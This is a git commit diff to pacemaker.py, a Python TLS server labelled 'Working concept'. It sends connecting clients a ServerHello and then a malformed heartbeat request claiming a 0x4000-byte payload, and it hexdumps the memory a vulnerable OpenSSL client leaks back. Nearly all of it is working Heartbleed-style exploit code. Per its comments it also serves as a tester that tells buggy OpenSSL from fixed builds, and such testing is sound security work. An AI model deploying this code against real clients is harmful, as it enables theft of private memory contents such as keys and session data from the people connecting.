c020ff9b21c6c5173833002bf5876fc2cf045b5d
Peter Wu <peter@lekensteyn.nl>
2014-04-08 23:54:14 +0200

    Working concept

--- pacemaker.py
+++ pacemaker.py
@@ -5,15 +5,16 @@
 import socketserver
 import sys
 import struct
+import select, time
 
-def make_hello(cipher):
+def make_hello(sslver, cipher):
     # Record
-    data = '16 03 02'
+    data = '16 ' + sslver
     data += ' 00 31' # Record ength
     # Handshake
     data += ' 02 00'
     data += ' 00 2d' # Handshake length
-    data += ' 03 02' # TLS version
+    data += ' ' + sslver
     data += '''
     52 34 c6 6d 86 8d e8 40 97 da
     ee 7e 21 c4 1d 2e 9f e9 60 5f 05 b0 ce af 7e b7
@@ -28,28 +29,29 @@ def make_hello(cipher):
     data += ' 01'    # mode
     return bytearray.fromhex(data.replace('\n', ''))
 
-def make_cert():
-    data = '16 03 02'
-    data += ' 00 07' # Length
-    # Handshake
-    data += ' 0b' # Certificate
-    data += ' 00 00 03' # Length
-    data += ' 00 00 00' # Certificates length
-    # TODO: fix parameters
-    return bytearray.fromhex(data.replace('\n', ''))
-
-def make_done():
-    data = '16 03 02'
-    data += ' 00 04' # Length
-    data += ' 0e 00 00 00'
-    return bytearray.fromhex(data.replace('\n', ''))
-
-def make_heartbeat():
-    data = '18 03 02'
+def make_heartbeat(sslver):
+    data = '18 ' + sslver
     data += ' 00 03'    # Length
     data += ' 01'       # Type: Request
-    data += ' ff ff'    # Payload Length
+    data += ' 40 00'    # Payload Length (larger values do not work)
     return bytearray.fromhex(data.replace('\n', ''))
+
+def hexdump(data):
+    allzeroes = b'\0' * 16
+    zerolines = 0
+
+    for i in range(0, len(data), 16):
+        line = data[i:i+16]
+        if line == allzeroes:
+            zerolines += 1
+            if zerolines == 2:
+                print("*")
+            if zerolines >= 2:
+                continue
+
+        print("{:04x}: {:47}  {}".format(16 * i,
+            ' '.join('{:02x}'.format(c) for c in line),
+            ''.join(chr(c) if c >= 32 and c < 127 else '.' for c in line)))
 
 class TCPSvr(socketserver.BaseRequestHandler):
     def handle(self):
@@ -68,21 +70,38 @@ class TCPSvr(socketserver.BaseRequestHandler):
         off += 1 + sid_len # Skip length and SID
         ciphers_len = struct.unpack("<H", hnd[off:off+2])
         off += 2
-        # TODO: pick a cipher that does not need ServerKeyExchange
-        #cipher = hnd[off:off+2]
-        cipher = (0, 0xa) # TODO: refine cipher selection
+        # The first cipher is fine...
+        cipher = hnd[off:off+2]
+
+        sslver = '{:02x} {:02x}'.format(ver >> 8, ver & 0xFF)
 
         # (1) Handshake: ServerHello
-        self.request.sendall(make_hello(cipher))
+        self.request.sendall(make_hello(sslver, cipher))
 
-        # (2) Certificate
-        self.request.sendall(make_cert())
+        # (skip Certificate, etc.)
 
-        # (3) ServerHelloDone
-        self.request.sendall(make_done())
+        # (2) HeartbeatRequest
+        self.request.sendall(make_heartbeat(sslver))
 
-        # (4) HeartbeatRequest
-        self.request.sendall(make_heartbeat())
+        # (3) Buggy OpenSSL will throw 0x4000 bytes, fixed ones stay silent
+        self.read_memory(self.request, 5)
+
+    def read_memory(self, sock, timeout):
+        end_time = time.time() + timeout
+        buffer = bytearray()
+        wanted_bytes = 0x4000
+
+        while wanted_bytes > 0 and timeout > 0:
+            rl, _, _ = select.select([sock], [], [], timeout)
+            data = rl[0].recv(wanted_bytes)
+            if not data: # EOF
+                break
+            buffer += data
+            wanted_bytes -= len(data)
+            timeout = end_time - time.time()
+
+        hexdump(buffer)
+
     def expect(self, cond, what):
         if not cond:
             print("Expected " + what)
